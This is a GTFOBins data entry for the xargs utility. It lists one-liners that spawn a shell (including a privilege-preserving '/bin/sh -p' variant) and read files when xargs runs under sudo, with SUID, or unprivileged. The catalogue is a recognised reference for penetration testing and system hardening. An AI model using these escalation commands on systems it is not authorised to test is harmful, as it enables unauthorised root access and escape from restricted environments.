<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/xargs -->
---
functions:
  file-read:
  - binary: false
    code: |-
      xargs -a /path/to/input-file -0
    contexts:
      sudo:
      suid:
      unprivileged:
    version: |-
      GNU
  shell:
  - code: |-
      xargs -a /dev/null /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          xargs -a /dev/null /bin/sh -p
        shell: false
      unprivileged:
    version: |-
      GNU
  - code: |-
      xargs -a /dev/null /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          xargs -a /dev/null /bin/sh -p
        shell: false
      unprivileged:
  - code: |-
      echo x | xargs -o -a /dev/null /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          echo x | xargs -o -a /dev/null /bin/sh -p
        shell: false
      unprivileged:
...
